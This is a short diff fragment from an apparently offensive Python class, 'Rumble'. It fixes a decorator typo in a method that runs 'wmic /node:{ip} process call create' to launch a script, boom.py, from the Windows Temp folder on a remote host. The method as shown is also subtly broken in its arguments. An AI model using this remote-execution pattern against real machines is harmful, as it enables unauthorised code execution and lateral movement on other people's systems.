@@ -30,7 +30,7 @@ class Rumble:
             sleep(8)
             self.wmic('python c:\\Windows\\Temp\\boom\\boom.py')
         
-        @classmeathod 
+        @classmethod 
         def wmic(ip, command):
             system(f'wmic /node:{ip} process call create "{command}"')
 
